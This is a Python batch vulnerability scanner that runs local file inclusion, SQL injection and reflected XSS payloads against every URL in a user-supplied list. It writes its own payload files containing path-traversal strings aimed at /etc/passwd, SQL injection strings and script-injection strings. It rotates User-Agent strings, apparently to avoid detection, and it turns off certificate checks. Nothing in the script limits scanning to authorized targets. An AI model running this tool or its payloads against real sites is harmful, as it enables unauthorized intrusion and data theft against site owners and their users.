import requests
import time
import os
import random # Added for UA rotation
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

# --- Constants ---
LFI_OUTPUT_FILE = "lfi_vulns.txt"
LFI_PAYLOAD_FILE = "payloads/lfi_payloads.txt"
SQLI_PAYLOAD_FILE = "payloads/sql_payloads.txt"
XSS_PAYLOAD_FILE = "payloads/xss_payloads.txt"
HASH_SAMPLE_FILE = "payloads/hash_samples.txt"
USER_AGENTS_FILE = "payloads/user_agents.txt" # Added UA file
DEFAULT_USER_AGENT = "FastBatchScannerUA/1.3" # Default UA

# --- Global Variables ---
LOADED_USER_AGENTS = [] # Global list to hold user agents

# --- Core Functions ---

def make_request(url, headers=None): # Removed user_agents param, will use global
    """Makes a GET request with rotated UA, returns response object and decoded text chunk or None, None."""
    global LOADED_USER_AGENTS # Access the global list
    global DEFAULT_USER_AGENT

    # Select User-Agent
    if LOADED_USER_AGENTS:
        selected_ua = random.choice(LOADED_USER_AGENTS)
    else:
        selected_ua = DEFAULT_USER_AGENT # Fallback

    # Prepare headers
    final_headers = {"User-Agent": selected_ua}
    if headers: # If custom headers are provided, merge them (rotated UA takes precedence if key clashes)
        final_headers.update(headers)
        final_headers["User-Agent"] = selected_ua # Ensure our rotated UA is used

    try:
        response = requests.get(url, headers=final_headers, timeout=7, verify=False, allow_redirects=False, stream=True)
        content_chunk = response.raw.read(1024 * 5, decode_content=True)
        response.close()
        return response, content_chunk.decode('utf-8', errors='ignore')
    except requests.exceptions.RequestException as e:
        # print(f"[-] Request error for {url}: {e}")
        return None, None
    except Exception as e:
        # print(f"[-] General error for {url}: {e}")
        return None, None

def save_finding(filename, finding_text):
    """Appends a finding to the specified file."""
    try:
        with open(filename, 'a') as f:
            f.write(f"{finding_text}\n")
    except Exception as e:
        print(f"[-] Error saving finding to {filename}: {e}")

# --- Test Functions (No signature changes needed as make_request uses global UA list) ---

def test_lfi_payloads(base_url, log):
    """Tests for LFI vulnerabilities using common params and payloads."""
    log(f"[*] Starting LFI scan on {base_url}...")
    # ... (rest of the function remains the same, calls make_request normally)
    if not os.path.exists(LFI_PAYLOAD_FILE):
        log(f"[-] LFI payload file not found: {LFI_PAYLOAD_FILE}. Skipping LFI for this target.")
        return

    lfi_indicators = [
        "root:x:0:0:", "\[boot loader\]", "Windows\\System32\\drivers\\etc\\hosts",
        "servlet-mapping", "DB_USERNAME", "<?php", "root:.*?:[0-9]*:[0-9]*:",
        "OdbcConnection",
    ]
    common_lfi_params = ["file", "page", "path", "include", "document", "view", "dir", "cat"]
    found_lfi_target = False

    try:
        with open(LFI_PAYLOAD_FILE) as f:
            payloads = [line.strip() for line in f if line.strip()]

        for lfi_param in common_lfi_params:
            for payload in payloads:
                parsed_url = urlparse(base_url)
                query = parse_qs(parsed_url.query)
                query[lfi_param] = payload
                url_parts = list(parsed_url)
                url_parts[4] = urlencode(query, doseq=True)
                url = urlunparse(url_parts)

                response, response_text = make_request(url) # Calls updated make_request

                if response and response_text:
                    for indicator in lfi_indicators:
                        # Using lower() for case-insensitive comparison for indicators
                        if indicator.lower() in response_text.lower():
                            finding = f"[Target: {base_url}] [!] LFI Possible → URL: {url}"
                            log(finding)
                            save_finding(LFI_OUTPUT_FILE, finding)
                            found_lfi_target = True
                            # Break indicator loop only, continue checking other payloads/params might find more
                            break
    except FileNotFoundError:
         log(f"[-] LFI payload file missing: {LFI_PAYLOAD_FILE}")
    except Exception as e:
        log(f"[-] LFI test error for {base_url}: {e}")

def test_sql_payloads(base_url, param_name, log):
    """Tests for SQL injection vulnerabilities on a specific parameter."""
    # ... (rest of the function remains the same, calls make_request normally)
    if not os.path.exists(SQLI_PAYLOAD_FILE):
        return

    sql_error_indicators = ["sql", "syntax", "warning", "mysql", "error", "unclosed quotation mark", "odbc", "invalid input"]
    found_sqli = False
    try:
        with open(SQLI_PAYLOAD_FILE) as f:
             payloads = [line.strip() for line in f if line.strip()]

        for payload in payloads:
            parsed_url = urlparse(base_url)
            query = parse_qs(parsed_url.query)
            query[param_name] = payload
            url_parts = list(parsed_url)
            url_parts[4] = urlencode(query, doseq=True)
            url = urlunparse(url_parts)

            response, response_text = make_request(url) # Calls updated make_request

            if response and response_text and any(err in response_text.lower() for err in sql_error_indicators):
                finding = f"[Target: {base_url}] [!] SQLi Possible → Param: {param_name}, Payload: {payload}"
                log(finding)
                found_sqli = True
                break
    except FileNotFoundError:
         pass
    except Exception as e:
        log(f"[-] SQLi test error for {base_url} / {param_name}: {e}")

def test_xss_payloads(base_url, param_name, log):
    """Tests for reflected XSS vulnerabilities on a specific parameter."""
    # ... (rest of the function remains the same, calls make_request normally)
    if not os.path.exists(XSS_PAYLOAD_FILE):
        return

    found_xss = False
    try:
        with open(XSS_PAYLOAD_FILE) as f:
             payloads = [line.strip() for line in f if line.strip()]
        for payload in payloads:
            parsed_url = urlparse(base_url)
            query = parse_qs(parsed_url.query)
            query[param_name] = payload
            url_parts = list(parsed_url)
            url_parts[4] = urlencode(query, doseq=True)
            url = urlunparse(url_parts)

            response, response_text = make_request(url) # Calls updated make_request

            if response and response_text and payload in response_text:
                is_complex_payload = any(c in payload for c in '<>"\'()')
                if is_complex_payload:
                    # Basic check to reduce false positives if payload is simple alphanumeric
                    is_likely_fp = payload.isalnum() and len(payload) < 10
                    if not is_likely_fp:
                        finding = f"[Target: {base_url}] [!] XSS Possible (Reflected) → Param: {param_name}, Payload: {payload}"
                        log(finding)
                        found_xss = True
                        break
    except FileNotFoundError:
         pass
    except Exception as e:
        log(f"[-] XSS test error for {base_url} / {param_name}: {e}")

def detect_hash_type_and_guess(log):
    """Analyzes hashes from a file and guesses the type."""
    # ... (This function doesn't make web requests, so no changes needed)
    log("[*] Analyzing hashes...")
    if not os.path.exists(HASH_SAMPLE_FILE):
        log(f"[-] Hash sample file not found: {HASH_SAMPLE_FILE}. Skipping hash analysis.")
        return

    try:
        with open(HASH_SAMPLE_FILE) as f:
            hashes = [line.strip() for line in f if line.strip()]
        if not hashes:
            log("[-] Hash sample file is empty.")
            return

        for h in hashes:
            log_msg = f"[?] {h[:30]}... → Unknown hash type" # Default message
            h_lower = h.lower()

            if len(h) == 32 and all(c in '0123456789abcdef' for c in h_lower): log_msg = f"[+] {h} → Possible MD5"
            elif len(h) == 40 and all(c in '0123456789abcdef' for c in h_lower): log_msg = f"[+] {h} → Possible SHA1"
            elif len(h) == 64 and all(c in '0123456789abcdef' for c in h_lower): log_msg = f"[+] {h} → Possible SHA256"
            elif len(h) == 56 and all(c in '0123456789abcdef' for c in h_lower): log_msg = f"[+] {h} → Possible SHA224"
            elif len(h) == 96 and all(c in '0123456789abcdef' for c in h_lower): log_msg = f"[+] {h} → Possible SHA384"
            elif len(h) == 128 and all(c in '0123456789abcdef' for c in h_lower): log_msg = f"[+] {h} → Possible SHA512"
            elif h.startswith(("$2a$", "$2b$", "$2y$")): log_msg = f"[+] {h[:30]}... → Possible bcrypt"
            elif h.startswith("$1$"): log_msg = f"[+] {h[:30]}... → Possible MD5-Crypt"
            elif h.startswith("$5$"): log_msg = f"[+] {h[:30]}... → Possible SHA256-Crypt"
            elif h.startswith("$6$"): log_msg = f"[+] {h[:30]}... → Possible SHA512-Crypt"
            elif "$argon2id$" in h or "$argon2i$" in h or "$argon2d$" in h: log_msg = f"[+] {h[:30]}... → Possible Argon2"
            elif h.startswith("{SSHA}"): log_msg = f"[+] {h[:30]}... → Possible SSHA (LDAP)"

            log(log_msg)
    except FileNotFoundError:
         log(f"[-] Hash sample file missing: {HASH_SAMPLE_FILE}")
    except Exception as e:
        log(f"[-] Hash analysis error: {e}")
    log("[*] Hash analysis finished.")


# --- Utility ---

def load_user_agents(filepath, default_ua, log):
    """Loads user agents from file, returns list or default."""
    try:
        if os.path.exists(filepath):
            with open(filepath, 'r') as f:
                uas = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            if uas:
                log(f"[*] Loaded {len(uas)} user agents from {filepath}")
                return uas
            else:
                log(f"[-] User agent file '{filepath}' is empty. Using default.")
                return [default_ua]
        else:
            log(f"[-] User agent file '{filepath}' not found. Using default.")
            return [default_ua]
    except Exception as e:
        log(f"[-] Error loading user agents from {filepath}: {e}. Using default.")
        return [default_ua]

def prepare_payload_files(log):
    """Checks for payload dir/files and creates dummies if missing."""
    payload_dir = 'payloads'
    if not os.path.exists(payload_dir):
        try:
            os.makedirs(payload_dir)
            log(f"[*] Created directory: {payload_dir}")
        except OSError as e:
            log(f"[-] Failed to create directory {payload_dir}: {e}. Exiting.")
            return False

    # Added User Agent file
    files_to_check = {
        LFI_PAYLOAD_FILE: "../../../../etc/passwd\n../../../../boot.ini\n",
        SQLI_PAYLOAD_FILE: "' OR '1'='1\n' UNION SELECT null, version() -- \n",
        XSS_PAYLOAD_FILE: "<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n",
        HASH_SAMPLE_FILE: "5f4dcc3b5aa765d61d8327deb882cf99\n$2y$10$ExampleHashExampleHashExampleHashExampleHashExampleHashEx\n",
        USER_AGENTS_FILE: ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\n"
                           "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1\n"
                           f"{DEFAULT_USER_AGENT}\n") # Include default in dummy file
    }

    all_files_ok = True
    for fpath, dummy_content in files_to_check.items():
        if not os.path.exists(fpath):
            try:
                with open(fpath, 'w') as f:
                    f.write(dummy_content)
                log(f"[*] Created dummy payload file: {fpath}")
            except IOError as e:
                log(f"[-] Failed to create dummy file {fpath}: {e}")
                all_files_ok = False

    # Check existence again after attempting creation
    if not os.path.exists(SQLI_PAYLOAD_FILE): log(f"[-] Warning: SQLi payload file missing: {SQLI_PAYLOAD_FILE}")
    if not os.path.exists(XSS_PAYLOAD_FILE): log(f"[-] Warning: XSS payload file missing: {XSS_PAYLOAD_FILE}")
    if not os.path.exists(LFI_PAYLOAD_FILE): log(f"[-] Warning: LFI payload file missing: {LFI_PAYLOAD_FILE}")
    # No warning needed for UA file, handled by load_user_agents

    return all_files_ok

# --- Main Execution ---

def run_tests():
    """Gets target list file and runs scans with rotated UAs."""
    # Simple logger
    def log(msg): print(msg)
    global LOADED_USER_AGENTS # Need to modify the global list

    log("--- Fast Batch Vulnerability Scanner w/ UA Rotation ---")
    log(f"Using payload files from '{os.path.dirname(LFI_PAYLOAD_FILE)}/' directory.")
    log(f"LFI hits will be saved to: {LFI_OUTPUT_FILE}")
    log("-" * 30)

    if not prepare_payload_files(log):
        log("[-] Errors preparing payload files. Cannot continue reliably. Exiting.")
        return

    # --- Load User Agents ---
    LOADED_USER_AGENTS = load_user_agents(USER_AGENTS_FILE, DEFAULT_USER_AGENT, log)
    log("-" * 30)

    # --- Get Target Info ---
    target_list_file = input("Enter filename containing list of target URLs (one per line): ").strip()
    if not target_list_file:
        log("[-] No target file provided. Exiting.")
        return

    try:
        with open(target_list_file, 'r') as f:
            target_urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        if not target_urls:
            log(f"[-] Target file '{target_list_file}' is empty or contains no valid URLs. Exiting.")
            return
        log(f"[*] Loaded {len(target_urls)} target(s) from {target_list_file}")
    except FileNotFoundError:
        log(f"[-] Target file not found: {target_list_file}. Exiting.")
        return
    except Exception as e:
        log(f"[-] Error reading target file {target_list_file}: {e}. Exiting.")
        return

    sqli_params_str = input("Parameter name(s) for SQLi (comma-separated, e.g., id,user): ").strip()
    xss_params_str = input("Parameter name(s) for XSS (comma-separated, e.g., query,search): ").strip()
    log("-" * 30)

    # --- Run Tests ---
    start_time = time.time()
    total_targets = len(target_urls)

    for i, base_url in enumerate(target_urls):
        log(f"[*] Scanning Target {i+1}/{total_targets}: {base_url}")

        # Call test functions (they use make_request which now handles UA rotation)
        test_lfi_payloads(base_url, log)

        if sqli_params_str:
            for param in sqli_params_str.split(','):
                param = param.strip()
                if param: test_sql_payloads(base_url, param, log)
        else: log(f"  [-] Skipping SQLi for {base_url} (no params specified).")

        if xss_params_str:
            for param in xss_params_str.split(','):
                 param = param.strip()
                 if param: test_xss_payloads(base_url, param, log)
        else: log(f"  [-] Skipping XSS for {base_url} (no params specified).")

        log(f"[*] Finished scanning {base_url}")
        log("-" * 10)


    # --- Hash Analysis (Run once after all targets) ---
    detect_hash_type_and_guess(log)

    # --- Finish ---
    end_time = time.time()
    log("-" * 30)
    log(f"[*] All scans finished in {end_time - start_time:.2f} seconds.")
    if os.path.exists(LFI_OUTPUT_FILE) and os.path.getsize(LFI_OUTPUT_FILE) > 0:
        log(f"[!] Check '{LFI_OUTPUT_FILE}' for potential LFI findings.")
    else:
         log("[*] No LFI findings were saved.")


if __name__ == "__main__":
    # Disable insecure request warnings (use cautiously)
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    run_tests()
